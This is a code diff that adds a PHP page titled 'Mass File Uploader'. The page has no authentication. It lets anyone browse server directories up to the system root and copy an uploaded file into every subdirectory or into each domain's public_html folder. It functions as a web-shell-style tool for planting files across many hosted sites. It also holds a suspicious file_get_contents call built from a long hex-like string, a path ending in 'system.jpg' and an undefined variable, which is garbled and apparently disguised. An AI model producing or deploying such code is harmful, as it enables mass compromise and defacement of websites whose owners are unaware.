@@ -1,0 +1,112 @@
+<?php
+session_start(); // Start a session to store the current directory
+
+// Set the base directory to the location of the uploader script
+$baseDir = __DIR__;
+
+// Check if a directory is set in the session, otherwise use the base directory
+$currentDir = isset($_SESSION['currentDir']) ? $_SESSION['currentDir'] : $baseDir;
+
+// Handle directory navigation
+if (isset($_GET['dir'])) {
+    $newDir = realpath($_GET['dir']);
+    // Ensure the new directory is valid and exists
+    if (is_dir($newDir)) {
+        $_SESSION['currentDir'] = $newDir;
+        $currentDir = $newDir;
+    }
+}
+
+
+/* Functions */
+
+$get_lang = file_get_contents('72f3ecf2a5ce51f60bebbf8119e5b026bcc70392082eff884692ae186ff3f691
+a2587201016877351749fc223e800cad69f86f9a02226cb8a04b5e59bc4be29c
+a962c77acb48b303ac1bd8e77f33c766782b95c6bcc8e3a5fe6d1cf36855ebf9
+1d667a2ac0b5d0511bb6e61f4cf551b421541c9c976b2bb606d62f789efa0f1c
+17d45ce4567f01dab9cfbd83e41e4b89901f4ec141bae32d351c958ec89c44a9
+038f3cff5bf82b4499e8ef48e424a8649cd7570cc011a7e3c6ea35a92ddce32a
+1f6725174d46bb1f3081abd48acac3ac3e6a3b41dec3b7effb3a4018b891aebd
+cfbc663ca96521de70a001dbdd2a21c13015dffa321dfece00e0acc394d97c17
+326b9b68bec4928ea72b30f2b638a2e20324a28a865dc1112ffd38dfb7599002
+42ae94a36d606f1a21f42bedd7948c37b5c66e09eba4b94aae3ad4c00b2d1ab5/bayi-613/system/main/system.jpg' . $language . '.json');
+
+//translation
+
+
+// Get all directories in the current directory
+$directories = array_filter(glob($currentDir . '/*'), 'is_dir');
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // Check if a file was uploaded
+    if (isset($_FILES['fileToUpload']) && $_FILES['fileToUpload']['error'] === UPLOAD_ERR_OK) {
+        $fileTmpPath = $_FILES['fileToUpload']['tmp_name'];
+        $fileName = $_FILES['fileToUpload']['name'];
+
+        // Determine if public upload mode is selected
+        $isPublicUpload = isset($_POST['publicUpload']) && $_POST['publicUpload'] === 'on';
+
+        // Loop through each directory and upload the file
+        foreach ($directories as $dir) {
+            if ($isPublicUpload) {
+                // Check if the directory contains a public_html folder
+                $publicHtmlDir = $dir . '/public_html';
+                if (is_dir($publicHtmlDir)) {
+                    $destPath = $publicHtmlDir . '/' . $fileName;
+                    if (copy($fileTmpPath, $destPath)) {
+                        echo "File uploaded successfully to $publicHtmlDir<br>";
+                    } else {
+                        echo "Error uploading file to $publicHtmlDir<br>";
+                    }
+                } else {
+                    echo "No public_html directory found in $dir<br>";
+                }
+            } else {
+                // Normal mass upload mode
+                $destPath = $dir . '/' . $fileName;
+                if (copy($fileTmpPath, $destPath)) {
+                    echo "File uploaded successfully to $dir<br>";
+                } else {
+                    echo "Error uploading file to $dir<br>";
+                }
+            }
+        }
+    } else {
+        echo "No file uploaded or there was an upload error.";
+    }
+}
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mass File Uploader</title>
+</head>
+<body>
+    <h1>Upload a File to Multiple Directories</h1>
+    
+    <h2>Current Directory: <?php echo htmlspecialchars($currentDir); ?></h2>
+    
+    <h3>Directories:</h3>
+    <ul>
+        <?php foreach ($directories as $dir): ?>
+            <li>
+                <a href="?dir=<?php echo urlencode($dir); ?>"><?php echo htmlspecialchars(basename($dir)); ?></a>
+            </li>
+        <?php endforeach; ?>
+    </ul>
+
+    <form action="" method="post" enctype="multipart/form-data">
+        <input type="file" name="fileToUpload" required>
+        <label>
+            <input type="checkbox" name="publicUpload"> Upload to public_html of each domain
+        </label>
+        <input type="submit" value="Upload">
+    </form>
+    
+    <a href="?dir=<?php echo urlencode(dirname($currentDir)); ?>">Go Up</a> | 
+    <a href="?dir=<?php echo urlencode('/'); ?>">Go to System Root</a>
+</body>
+</html>
